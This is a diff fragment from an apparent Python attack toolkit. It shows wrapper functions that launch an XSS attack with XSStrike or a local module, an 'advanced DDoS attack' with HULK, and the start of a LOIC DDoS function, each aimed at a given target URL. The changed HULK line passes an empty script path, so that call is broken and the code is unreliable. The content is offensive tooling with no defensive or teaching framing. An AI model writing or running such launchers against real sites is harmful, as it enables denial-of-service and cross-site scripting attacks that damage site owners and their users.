@@ -40,12 +40,12 @@ def stealthy_port_scanner(target_ip):
 # Function to perform XSS attack using XSStrike
 def xss_attack(target_url):
     print(f"\n{Fore.YELLOW}Performing XSS Attack on {target_url}...")
-    subprocess.run(["python3", "XSstrike/xsstrike.py", "-u", target_url])
+    subprocess.run(["python3", "modules/xss_attack/xssattack.py", "-u", target_url])
 
 # Function to execute an advanced DDoS attack using HULK
 def advanced_ddos_attack(target_url):
     print(f"\n{Fore.YELLOW}Launching Advanced DDoS Attack on {target_url}...")
-    subprocess.run(["python3", "HULK/hulk.py", "-site", target_url])
+    subprocess.run(["python3", "", "-site", target_url])
 
 # Function to execute a DDoS attack using LOIC (Low Orbit Ion Cannon)
 def ddos_attack(target_url):
